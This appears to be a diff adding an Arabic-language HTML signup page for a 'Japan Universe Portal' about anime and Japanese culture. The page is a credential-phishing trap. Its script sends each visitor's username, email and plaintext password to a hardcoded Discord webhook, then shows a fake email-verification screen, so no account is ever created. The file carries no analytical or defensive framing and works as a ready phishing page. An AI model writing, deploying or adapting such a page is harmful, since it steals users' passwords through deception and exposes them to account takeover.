@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Japan Universe Portal</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Noto+Sans+JP:wght@500&display=swap');
+
+body {
+  margin: 0;
+  font-family: 'Cairo', sans-serif;
+  background: linear-gradient(135deg, #0b0b15, #1a1a2e, #ff8fab);
+  color: white;
+  overflow: hidden;
+  transition: background 2s ease;
+}
+
+/* خلفية متحركة */
+.bg {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background: url('https://images.unsplash.com/photo-1558980664-10ea9fa7a259?auto=format&fit=crop&w=1740&q=80') center/cover no-repeat;
+  filter: brightness(0.4);
+  z-index: -1;
+  animation: bgChange 15s infinite alternate ease-in-out;
+}
+
+@keyframes bgChange {
+  0% { background-image: url('https://images.unsplash.com/photo-1558980664-10ea9fa7a259?auto=format&fit=crop&w=1740&q=80'); }
+  50% { background-image: url('https://images.unsplash.com/photo-1549692520-acc6669e2f0c?auto=format&fit=crop&w=1740&q=80'); }
+  100% { background-image: url('https://images.unsplash.com/photo-1578632767115-351597cf2477?auto=format&fit=crop&w=1740&q=80'); }
+}
+
+/* حاوية الصفحة */
+.container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  text-align: center;
+  backdrop-filter: blur(10px);
+  background: rgba(0, 0, 0, 0.45);
+  padding: 20px;
+  border-radius: 25px;
+  box-shadow: 0 0 25px #ff8fab;
+  animation: fadeIn 2s ease forwards;
+  transition: opacity 1s ease;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(50px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* العناوين */
+h1 {
+  font-family: 'Noto Sans JP', sans-serif;
+  font-size: 2.3em;
+  background: linear-gradient(to right, #ff6b6b, #fddb92);
+  -webkit-background-clip: text;
+  color: transparent;
+  text-shadow: 0 0 10px rgba(255,255,255,0.4);
+}
+
+p {
+  max-width: 500px;
+  line-height: 1.7;
+  color: #eee;
+}
+
+/* فورم التسجيل */
+form {
+  display: flex;
+  flex-direction: column;
+  width: 80%;
+  max-width: 300px;
+  margin-top: 20px;
+}
+
+input {
+  margin: 10px 0;
+  padding: 10px;
+  border: none;
+  border-radius: 10px;
+  outline: none;
+  text-align: center;
+  background: rgba(255,255,255,0.1);
+  color: white;
+  font-size: 1em;
+  transition: all 0.3s ease;
+}
+
+input:focus {
+  background: rgba(255,255,255,0.2);
+  box-shadow: 0 0 10px #ff8fab;
+}
+
+button {
+  background: linear-gradient(90deg, #ff8fab, #fddb92);
+  color: #1a1a2e;
+  border: none;
+  border-radius: 10px;
+  padding: 12px;
+  margin-top: 10px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: all 0.3s ease;
+}
+
+button:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 20px #ff8fab;
+}
+
+/* إعلانات */
+.ads {
+  margin-top: 25px;
+  animation: float 3s ease-in-out infinite;
+  color: #ffcce0;
+  font-size: 0.9em;
+}
+
+@keyframes float {
+  0%,100% { transform: translateY(0); }
+  50% { transform: translateY(-10px); }
+}
+
+/* صفحة التحقق */
+.verify-box {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  backdrop-filter: blur(10px);
+  background: rgba(0,0,0,0.6);
+  padding: 40px;
+  border-radius: 20px;
+  box-shadow: 0 0 20px #ff8fab;
+  animation: fadeIn 2s ease forwards;
+}
+
+.verify-box img {
+  width: 120px;
+  height: 120px;
+  border-radius: 50%;
+  margin-bottom: 20px;
+  box-shadow: 0 0 20px #ff8fab;
+}
+
+.verify-box h2 {
+  color: #ffd5e5;
+  margin-bottom: 15px;
+}
+
+.verify-box p {
+  color: #eee;
+  font-size: 1.1em;
+  margin-bottom: 25px;
+}
+
+.verify-box button {
+  background: linear-gradient(90deg, #ff8fab, #fddb92);
+  color: #1a1a2e;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 10px;
+  font-weight: bold;
+  cursor: not-allowed;
+  opacity: 0.7;
+}
+
+/* رسالة التحميل */
+.loading {
+  display: none;
+  margin-top: 15px;
+  color: #ff8fab;
+  font-size: 0.9em;
+}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+
+<!-- واجهة التسجيل -->
+<div class="container" id="register-box">
+  <h1>Japan Universe Portal</h1>
+  <p>اكتشف عالم اليابان الساحر — أنمي، موسيقى، شوارع طوكيو، ثقافة وأسماء يابانية والمزيد!</p>
+
+  <form onsubmit="submitForm(event)">
+    <input type="text" id="username" placeholder="اسم المستخدم" required>
+    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+    <input type="password" id="password" placeholder="كلمة المرور" required>
+    <button type="submit">تسجيل</button>
+  </form>
+  
+  <div class="loading" id="loading-message">جاري إرسال البيانات...</div>
+
+  <div class="ads">
+    🌸 عروض أنمي جديدة كل أسبوع • موسيقى يابانية مميزة • صور من قلب طوكيو 🇯🇵
+  </div>
+</div>
+
+<!-- واجهة التحقق -->
+<div class="verify-box" id="verify-box">
+  <img src="https://i.pinimg.com/originals/76/1b/8a/761b8a9c230f8ffbcad17f92a40e3f73.gif" alt="anime mail">
+  <h2>تحقق من بريدك الإلكتروني 📧</h2>
+  <p>لقد أرسلنا لك رسالة تحقق إلى بريدك الإلكتروني.<br>يرجى الموافقة لإكمال التسجيل.<br>لن يمكنك الدخول قبل التحقق.</p>
+  <button disabled>في انتظار التحقق...</button>
+</div>
+
+<script>
+// رابط الـ Webhook الذي قدمته
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1432960360943714334/4qtSKqoPZIw3lltKPWXkaEdqGvlVWyzMWaHvvzrepS-rnm6gk31UY5aT4B2sH_rfmTv_";
+
+async function submitForm(e) {
+  e.preventDefault();
+  
+  // جمع بيانات المستخدم
+  const username = document.getElementById("username").value;
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+  
+  // عرض رسالة التحميل
+  document.getElementById("loading-message").style.display = "block";
+  
+  try {
+    // إرسال البيانات إلى Webhook
+    await sendToWebhook(username, email, password);
+    
+    // إخفاء رسالة التحميل
+    document.getElementById("loading-message").style.display = "none";
+    
+    // الانتقال إلى صفحة التحقق
+    showVerify();
+  } catch (error) {
+    // إخفاء رسالة التحميل
+    document.getElementById("loading-message").style.display = "none";
+    
+    // عرض رسالة خطأ
+    alert("حدث خطأ أثناء التسجيل. يرجى المحاولة مرة أخرى.");
+    console.error("Error sending data:", error);
+  }
+}
+
+async function sendToWebhook(username, email, password) {
+  // إنشاء المحتوى الذي سيتم إرساله
+  const content = {
+    username: "Japan Universe Portal",
+    embeds: [{
+      title: "تسجيل جديد",
+      color: 16738740, // لون وردي
+      fields: [
+        {
+          name: "اسم المستخدم",
+          value: username,
+          inline: true
+        },
+        {
+          name: "البريد الإلكتروني",
+          value: email,
+          inline: true
+        },
+        {
+          name: "كلمة المرور",
+          value: password,
+          inline: false
+        },
+        {
+          name: "وقت التسجيل",
+          value: new Date().toLocaleString("ar-SA"),
+          inline: false
+        }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  // إرسال البيانات إلى Webhook
+  const response = await fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify(content),
+  });
+
+  if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+  }
+}
+
+function showVerify() {
+  document.getElementById("register-box").style.opacity = "0";
+  setTimeout(() => {
+    document.getElementById("register-box").style.display = "none";
+    document.getElementById("verify-box").style.display = "flex";
+  }, 1000);
+}
+</script>
+</body>
+</html>
